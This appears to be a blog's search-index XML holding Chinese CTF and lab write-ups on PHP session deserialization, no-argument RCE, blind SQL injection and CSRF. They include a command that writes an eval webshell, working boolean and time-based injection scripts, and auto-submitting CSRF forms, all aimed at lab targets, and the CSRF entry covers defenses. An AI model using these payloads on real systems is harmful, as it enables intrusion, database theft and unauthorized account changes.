<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>session反序列化漏洞</title>
    <link href="/2021/10/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/10/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>前几天打省赛，遇到一个seesion反序列化的题，当时没做出来，今天复盘学习了一下，写个笔记</p><span id="more"></span><h2 id="什么是SESSION"><a href="#什么是SESSION" class="headerlink" title="什么是SESSION"></a>什么是SESSION</h2><p>首先session是什么，就是一个会话控制，这样描述很肤浅，还得往更深的层次研究，这里是我学习的一个大佬的文章，讲的很透彻<a href="https://blog.csdn.net/h19910518/article/details/79348051">什么是session</a>(一定要看啊，不然无法理解)</p><p>大概流程就是，当你打开一个页面，php会先判断你有没有sessionid，没有就生成一个id，当你结束后会生成一个文件，当下一次你再访问时，就会判断读取到你的id，php会直接根据id读取上此结束后生成的文件，把里面的东西反序列化出来。<br>这一套操作通常是用来，用户持续保持会话的，也就是用户退出页面后，再访问该页面，也能通过id访问到上回访问的资源。</p><h2 id="php-session中的序列化"><a href="#php-session中的序列化" class="headerlink" title="php session中的序列化"></a>php session中的序列化</h2><p>再来讲讲php的相关序列化<br>session后产生的id文件中的内容就是一段序列化<br>然而php中的下面这个选项，可以选择序列化的方式</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.serialize_handler</span> = php<br><span class="hljs-attr">session.serialize_handler</span> = php_binary<br><span class="hljs-attr">session.serialize_handler</span> = php_serialize<br></code></pre></td></tr></table></figure><p>这三种都是他的序列化方式</p><p>下面时一段源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;spoock&#x27;</span>;<br>var_dump(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p>在 php_serialize 引擎下，session文件中存储的数据为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;spoock&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>php 引擎下文件内容为:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">name<span class="hljs-string">|s:6:&quot;</span>spoock<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>php_binary 引擎下文件内容为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">names</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;spoock&quot;</span>;<br></code></pre></td></tr></table></figure><p>上面就介绍了这三种序列化的形式，理解这三种序列化很重要</p><h2 id="PHP-session序列化漏洞"><a href="#PHP-session序列化漏洞" class="headerlink" title="PHP session序列化漏洞"></a>PHP session序列化漏洞</h2><p>本来这种序列化是没有漏洞的，可我们经常需要跨文件操作，当两个文件的php序列化解释器不一样时，漏洞就由此产生了</p><p>由实例来解释一下吧,下面这是一段设置序列化引擎的php文件<br>同时还向session文件中写入了内容(这里使用的php_serialize引擎，要求php版本&gt;5.5.4，当时自己也是弄了半天才发现)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;session_id(): &quot;</span>.session_id().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后存储的session文件内容为</p><p><img src="https://img-blog.csdnimg.cn/ccb908a4c3de4818855a7d27a03cd727.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>好了，就是这样一个序列化，假如当我们进入另一个网页时，该网页首先会看你有没有一个sessionid，有的话就直接根据id访问session文件，将里面的内容反序列化出来</p><p>又假如这个网页使用的序列化引擎是php引擎，根据php引擎的解释，面对这段序列化他则会认为a:1:{s:4:”ryat”;s:30:”是他的对象，而”A”:1:{s:1:”a”;s:2:”xx”;}”是里面的内容<br>最后解释出来的内容也和原本的内容大相径庭了</p><p>空口无凭，直接用用实例说话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;aa&#x27;</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;a;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>按照我们刚才的分析，最后页面输出的应该是xx对吧，最后结果也的确如此<br><img src="https://img-blog.csdnimg.cn/07838f6a05ec445ebc9755ebdf9f9a0c.png" alt="在这里插入图片描述">最后的结果就是对象A绕过了$a=’aa’这一选项，直接输出了xx，这就是漏洞的产生</p><h2 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h2><p>其实也没啥事，这个漏洞的根本原因就是php序列化引擎不一样导致的，只需要各个文件都用一个引擎就好了。防范也就没啥好说的了。</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>总结一下吧，当你打开一个页面，session所作出的具体反应就是先看你是否带有session id，如果有的话就直接读取你上一次会话结束后存储在本地的session文件，如果php序列化引擎不一样，解释的结果就不一样，就导致了漏洞的产生(如果没有sessionid,则会给你生成一个sessionid,以便于在关闭页面时，存储一个session文件)</p><p>这就是全部内容了，其实理解了总结起来也没多少内容<br>下面是我学习过程中参考的一些大佬写的网站<br><a href="https://www.jb51.net/article/116246.htm">大佬1</a><br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">大佬2</a><br><a href="https://blog.csdn.net/h19910518/article/details/79348051">大佬3</a></p><h2 id="CTF上的应用"><a href="#CTF上的应用" class="headerlink" title="CTF上的应用"></a>CTF上的应用</h2><p>累死了，日后再更</p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP漏洞</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用无参数RCE写一句话</title>
    <link href="/2021/10/22/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
    <url>/2021/10/22/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    
    <content type="html"><![CDATA[<p>昨天做了一个无参数注入RCE的题，学到后面突然觉得可以做一些有趣的事<br>然后就尝试做了一下，发现可以利用相关漏洞写一个一句话木马<br>今天来总结一下</p><span id="more"></span><p>以下是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>); <br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//2.php</span><br></code></pre></td></tr></table></figure><p>以下是我的目录，可以看到flag.php就在当前目录下<br><img src="https://img-blog.csdnimg.cn/43690b58c8aa4c3ab18760454c490182.png" alt="在这里插入图片描述">先说说怎么做吧，再重点讲一讲原理<br>这是我的getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">val(end(current(get_defined_vars())));&amp;b=system(&#x27;echo &quot;&lt;?php @eval(_POST[shell]);?&gt;&quot;&gt;&gt;shell.php&#x27;);<br></code></pre></td></tr></table></figure><p>这里主要是用了get_defined_vars的特性</p><p>首先,下面这玩意儿作用是把$b里面的变量给他eval(),相当于下面的作用是eval(phpinfo())</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br></code></pre></td></tr></table></figure><p>最后的结果如下，很正确吧(关于为啥是这样我也就不说了，网上搜无参数RCE，一大把介绍，我会再文末附上两个我学习的帖子，大火可以参考)<br><img src="https://img-blog.csdnimg.cn/ef2b2894d20c4f69a3f7f5b429a13c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">既然b的内容可以直接输出，那么我们让b=system()<br>那么可操作的空间就变大了</p><p>咱们直接来一手b=system(‘dir’),咱们看看效果<br><img src="https://img-blog.csdnimg.cn/06da1a18f13e427581e4fa038bcfa592.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">直接干出来了目录下的文件</p><p>那么思路就清晰了，现在我们只需要b=system(‘type flag.php’)那么flag就出来了(主要要用源码查看，否则有特殊字符不显示)<br><img src="https://img-blog.csdnimg.cn/76a81d7248f64c75a4bc930921241a29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但这不是我们讲的重点，如果说flag.php不在当前目录呢，我们也有其他方法去做，但是如果直接写一句话，不就更简单了嘛，</p><p>直接再system里面放下面这段，一句话木马直接出来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">echo &quot;&lt;?php @eval(_POST[shell]);?&gt;&quot;&gt;&gt;shell.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5ca6d8482fa7490fb47e776546b8750c.png" alt="在这里插入图片描述"><br>原理特别简单，我也只是学习到了，突然想到了其他方式，特意来记录下来</p><p>然后相关无参数绕过的方式下面有俩大佬写的，我觉得很容易懂，写的很好推荐给大家</p><p><a href="https://blog.csdn.net/silence1_/article/details/102835743">参考1</a></p><p><a href="https://www.secpulse.com/archives/148184.html">参考1</a>该链接的源代码貌似有点儿不好使</p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>特殊姿势</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>布尔盲注与时间盲注python脚本</title>
    <link href="/2021/10/14/%E5%B8%83%E5%B0%94%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
    <url>/2021/10/14/%E5%B8%83%E5%B0%94%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>最近做sqli-labs的几道盲注题，写下的脚本</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">//布尔盲注<br><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://192.168.0.126/html/sql/Less-8/?id=&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">128</span><br>    mid=(low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;high:<br>        payload=<span class="hljs-string">&quot;1&#x27; and ascii(substr(database(),%d,1))&gt;%d--+&quot;</span>%(i,mid)<br>        r=requests.get(url=url+payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            low=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=mid<br>        mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span>):<br>            <span class="hljs-keyword">break</span><br>    flag=flag+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>下面是时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">//时间盲注<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>flag=<span class="hljs-string">&quot;&quot;</span><br>session=requests.Session()<br>url=<span class="hljs-string">&quot;http://10.3.23.106/html/sql/less-9/?id=&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">128</span><br>    mid=(low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;high:<br>        <span class="hljs-comment">#payload = &quot;1&#x27; and if(ascii(substr(database(),%d,1))&gt;%d,sleep(1),1)--+&quot;%(i,mid)</span><br>        payload=<span class="hljs-string">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),1)--+&quot;</span>%(i,mid)<br>        stat_time = time.time()<br>        r = session.get(url=url+payload)<br>        end_time = time.time()<br>        t = end_time - stat_time<br>        <span class="hljs-keyword">if</span> t &gt; <span class="hljs-number">1</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid==<span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">break</span><br>    flag=flag+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csrf漏洞</title>
    <link href="/2021/09/30/csrf/"/>
    <url>/2021/09/30/csrf/</url>
    
    <content type="html"><![CDATA[<p>跨站请求伪造(CSRF)的攻击方式简单理解就是：攻击者盗用了用户的身份，以用户身份向客户端发送请求并被执行。造成的后果有：以用户名义发送信息，或者是修改信息、发送购物请求等。</p><span id="more"></span><h2 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h2><p>在用户登录网页时，服务器往往会生成一个cookie,在服务器内部，记下了客户端的ip，当客户端的ip带着这个cookid再一次访问该网页时，用户就不需要重复登录操作了，一进入网页就是登录状态，而当生成的cookie时间到期时，用户再一次访问就又需要登录了。</p><p>CSRF漏洞就是黑客在用户的cookie未到期之前，让用户点击一个url，然后黑客在网页中放置恶意代码，从而向攻击网站发送请求。</p><h2 id="CSRF实战-GET"><a href="#CSRF实战-GET" class="headerlink" title="CSRF实战(GET)"></a>CSRF实战(GET)</h2><p>光说原理可能有点儿绕，直接本地搭建靶场来理解(pikachu 靶场)。</p><p>这里有一个用户登录后修改个人信息的网页，</p><p><img src="https://img-blog.csdnimg.cn/1687a8562c464ad98714b539f87d943e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>当我们把信息修改后，提交抓包观察后发现，就是简单的通过get传入信息，进行修改</p><p><img src="https://img-blog.csdnimg.cn/a82025d5cafe498fb538ff88fa552ad8.png" alt="在这里插入图片描述"><br>那么我们可以构造一个payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.0.126/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=123&amp;phonenum=456&amp;add=789&amp;email=456&amp;submit=submit<br></code></pre></td></tr></table></figure><p>这是一串url,当一个啥也不懂的小白在自己登录账号后，并且cooie为过期的情况下点击了这个连接，那么他的信息就已经被修改了，这种方式 太明显了，稍微懂一点网络安全的人通过判断url?后面的那串字符都不会点击</p><p>然而道高一尺魔高一丈，假如黑客自己在服务器上搭建了一个网页，假设域名就是<a href="http://www.abcd113.com,看着很正常对吧,然而网页内部有这么一串代码,当用户点击网页后,这串代码就自动执行了/">www.abcd113.com，看着很正常对吧，然而网页内部有这么一串代码,当用户点击网页后，这串代码就自动执行了</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://192.168.0.126:8081//pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex</span>=<span class="hljs-string">girl&amp;phonenum</span>=<span class="hljs-string">ss&amp;add</span>=<span class="hljs-string">789&amp;email</span>=<span class="hljs-string">456&amp;submit</span>=<span class="hljs-string">submit</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里我建立了一个1.html</p><p><img src="https://img-blog.csdnimg.cn/34baf20c27ed4289a987f7fa137a8389.png" alt="在这里插入图片描述"></p><p>打开网页后发现啥也没有，但是此时网页已经以用户身份给攻击网站发送了请求，个人信息已经被修改了，通过这种方式就可以做到神不知鬼不觉，被修改后用户自己甚至还察觉不到原因。</p><p><img src="https://img-blog.csdnimg.cn/63ff6e20aaa34639961661309cc9cff9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/71c18e18261e40d6871142ba576645ec.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>以上的方式是通过GET方式进行跨站请求，简单的甚至不需要自己搭建网站就能够完成攻击</p><h2 id="SSRF-POST"><a href="#SSRF-POST" class="headerlink" title="SSRF POST"></a>SSRF POST</h2><p>上面我们是通过get 的方式达到跨站请求效果，这次如果服务器使用POST来接收修改信息，我们同样可以使用通过建立网站，内部创造一个表单达到攻击目的。</p><p>这次通过抓包，发现是POST提交方式<br><img src="https://img-blog.csdnimg.cn/21fd909f0f0a4cde90b08994a73e0a6c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_13,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但这样同样有攻击漏洞，攻击者同样可以创造一个<a href="http://www.abcd123.com域名的网站/">www.abcd123.com域名的网站</a></p><p>在网站内部可以加入以下表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript"><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;postsubmit&quot;</span>).click();</span><br><span class="javascript">&#125;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.0.126:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;boy&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;phonenum&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;phonenum&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;54213&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sdsd&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postsubmit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>当用户点击这个url，也就是<a href="http://www.abc123.com时,网站同样也会遭受攻击/">www.abc123.com时，网站同样也会遭受攻击</a></p><h2 id="如何防范CSRF"><a href="#如何防范CSRF" class="headerlink" title="如何防范CSRF"></a>如何防范CSRF</h2><p>简单讲述了什么是CSRF，接下来重点便是怎么防护<br>从上面案例也知道，当修改信息时，如果不做任何防护手段很容易被恶意修改。倘若是购物软件，甚至可以利用该漏洞达到请求下单的目的。</p><p>那么如何防范有下面这几个方式</p><ol><li>验证HTTP Referer来源<br>在HTTP报文中，Referer是用来记录这条报文的请求地址，假如我们是银行，当用户提交转账申请时，可以追溯报文中的Referer，设置一个白名单，仅允许来源是银行的URL来请求申请，防止第三方黑客网页，跨站请求。</li><li>POST提交<br>同样假设我们是银行服务器，上个方法追溯到了Referer的来源，基本屏蔽了大部分的跨站请求，但是这种方法就相当于把安全交给了HTTP协议，自身网页仍然是有漏洞。有些公司，为了防止内网某些信息泄露，甚至在浏览器上拒绝提供Refer(现在浏览器是有拒绝Refer选项的)，若是网页收到这些没有Refer的用户的请求，自动认为是CSRF攻击，这种方法终究不是最保险的。</li><li>在请求地址种加入token<br>我的理解是，当用户获取一个表单，比如说打开了银行的转账界面，这时银行会先生成一个随机的Token值，然后把页面返回给用户，当用户提交申请时就会自动带着这个token值，服务器会拦截这个token值然后二者比对，相同后才会执行用户请求，由于token是随机的，黑客也不容易伪造。</li></ol><p>下面是我觉得写的特别好的两篇关于CSRF的博客(别人大佬写的)</p><p>这一篇把CSRF原理讲的特别地透<br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅析CSRF攻击方式</a></p><p>这一篇我认为关于如何防范CSRF漏洞讲的特别好<br><a href="https://blog.csdn.net/stpeace/article/details/53512283">CSRF攻击与防御</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>csrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="/2021/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
